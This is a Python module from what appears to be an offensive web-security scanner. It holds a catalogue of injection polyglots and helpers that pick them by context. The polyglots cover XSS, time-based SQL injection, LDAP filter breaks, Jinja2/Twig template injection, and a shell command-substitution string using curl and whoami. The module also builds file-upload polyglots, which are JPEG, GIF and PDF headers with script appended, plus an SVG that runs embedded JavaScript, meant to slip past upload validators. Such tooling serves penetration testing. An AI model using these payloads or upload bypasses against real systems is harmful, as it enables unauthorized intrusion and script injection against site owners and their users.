"""Cross-context polyglot payload generator.

A polyglot is a single string that triggers in multiple parsers. Real
applications process the same parameter through many contexts — URL,
HTML attribute, JS string, SQL, JSON, XML — and a polyglot hops every
context on one request. Two practical benefits:

* **Fewer requests** — instead of one probe per context, one probe
  covers them all. Lower WAF surface area, less rate-limiting risk.
* **Better blind detection** — when the page renders only one context
  but multiple back-ends process the parameter (e.g. logger + DB +
  template), a polyglot maximises the chance that at least *one* echo
  reaches the client.

The classics shipped here come from Gareth Heyes (XSS), 0xsobky's
"ultimate XSS polyglot", and Hahwul's jaSQLi-XSS combinations. We add
file-upload polyglots in :func:`file_polyglot` for the upload module.

This module is pure data — no network, no AI. The smart_payload mutation
engine consumes it; the file_upload module consumes ``file_polyglot``.
"""

from __future__ import annotations

import base64
from dataclasses import dataclass
from typing import Iterable, Optional


# ── Polyglot catalogue ──────────────────────────────────────────────────────


@dataclass(frozen=True)
class Polyglot:
    name: str
    payload: str
    contexts: tuple[str, ...]
    notes: str = ""


# Hand-curated, public-domain polyglots. The contexts tuple lists every
# parser the payload is *intended* to hop; coverage in practice depends
# on the deployment but the same string fired into a defective filter
# usually trips one of them.

GARETH_HEYES_XSS = Polyglot(
    name="gareth_heyes_xss",
    payload=(
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//'
        '%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/'
        '<sVg/oNloAd=alert()//>\\x3e'
    ),
    contexts=("html_text", "html_attr_quoted", "html_attr_unquoted",
              "js_string", "js_url", "html_comment"),
    notes="Classic Gareth Heyes XSS polyglot; tripping any one context "
          "leaks output.",
)

ULTIMATE_XSS_0XSOBKY = Polyglot(
    name="0xsobky_ultimate_xss",
    payload=(
        'javascript:"/*\'/*`/*--></noscript></title></textarea></style>'
        '</template></noembed></script><html \" onmouseover=/*&lt;svg/*'
        '/onload=alert()//>'
    ),
    contexts=("html_text", "html_attr_quoted", "js_string", "url_scheme"),
    notes="0xsobky's terse-but-aggressive variant.",
)

XSS_AND_SQLI = Polyglot(
    name="hahwul_xss_sqli",
    payload="<svg/onload=alert(1)>'\"`-->\\\";SELECT/**/SLEEP(5)--",
    contexts=("html_text", "sql_string", "sql_numeric", "shell_quote"),
    notes="Doubles as SQLi marker + HTML/JS XSS context-breaker.",
)

XSS_AND_LDAP = Polyglot(
    name="xss_ldap_injection",
    payload="*)(uid=*))(|(uid=*<script>alert(1)</script>",
    contexts=("ldap_filter", "html_text"),
)

JSON_AND_TEMPLATE = Polyglot(
    name="json_template_break",
    payload='"}}{{7*7}}{{config}}//"',
    contexts=("json_value", "template_jinja2", "template_twig"),
    notes="Breaks out of JSON string and into Jinja2/Twig expressions.",
)

CMDI_AND_XSS = Polyglot(
    name="cmdi_xss_combo",
    payload="$(curl example/<svg/onload=alert()>)`whoami`",
    contexts=("shell_cmd_sub", "shell_backtick", "html_text"),
)


POLYGLOTS: tuple[Polyglot, ...] = (
    GARETH_HEYES_XSS,
    ULTIMATE_XSS_0XSOBKY,
    XSS_AND_SQLI,
    XSS_AND_LDAP,
    JSON_AND_TEMPLATE,
    CMDI_AND_XSS,
)


# ── Selection helpers ──────────────────────────────────────────────────────


def select_polyglots(
    contexts: Iterable[str],
    *,
    catalogue: tuple[Polyglot, ...] = POLYGLOTS,
) -> list[Polyglot]:
    """Return every polyglot whose ``contexts`` overlaps the request set.

    Empty ``contexts`` → return every entry. Order is preserved so
    callers using ``[0]`` get a deterministic pick.
    """
    requested = set(contexts)
    if not requested:
        return list(catalogue)
    return [p for p in catalogue if set(p.contexts) & requested]


def generate_polyglot(contexts: Iterable[str]) -> list[str]:
    """Convenience wrapper — return just the payload strings."""
    return [p.payload for p in select_polyglots(contexts)]


def all_payloads() -> list[str]:
    """Every shipped payload, in declaration order."""
    return [p.payload for p in POLYGLOTS]


# ── File polyglots ─────────────────────────────────────────────────────────


# A minimal valid JPEG header followed by the JS payload — usable as a
# file-upload polyglot. The image preview still renders; the JS is
# executed when the file is served as text/html (path traversal / MIME
# confusion) or echoed into an HTML page (template uses raw filename
# contents).
_JPEG_MAGIC = bytes.fromhex("FFD8FFE000104A46494600010100000100010000")
_JPEG_EOI = bytes.fromhex("FFD9")

_GIF_MAGIC = b"GIF89a"

_PDF_HEADER = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"


def file_polyglot(kind: str, embedded: str) -> bytes:
    """Build a file with a valid magic header and ``embedded`` payload appended.

    ``kind`` is one of ``"jpeg"``, ``"gif"``, ``"pdf"``. The result
    passes most content-sniffing image upload validators while keeping
    the payload reachable to any plain-text consumer.
    """
    body = embedded.encode("utf-8")
    if kind == "jpeg":
        return _JPEG_MAGIC + body + _JPEG_EOI
    if kind == "gif":
        return _GIF_MAGIC + body
    if kind == "pdf":
        return _PDF_HEADER + body + b"\n%%EOF\n"
    raise ValueError(f"unsupported polyglot file kind: {kind!r}")


def svg_xss_polyglot(payload_js: str = "alert(1)") -> bytes:
    """SVG file that runs ``payload_js`` when rendered inline."""
    body = (
        '<?xml version="1.0" standalone="no"?>'
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
        '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
        '<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">'
        f'<script type="text/javascript">{payload_js}</script>'
        '</svg>'
    )
    return body.encode("utf-8")


__all__ = [
    "Polyglot",
    "POLYGLOTS",
    "GARETH_HEYES_XSS",
    "ULTIMATE_XSS_0XSOBKY",
    "XSS_AND_SQLI",
    "XSS_AND_LDAP",
    "JSON_AND_TEMPLATE",
    "CMDI_AND_XSS",
    "select_polyglots",
    "generate_polyglot",
    "all_payloads",
    "file_polyglot",
    "svg_xss_polyglot",
]
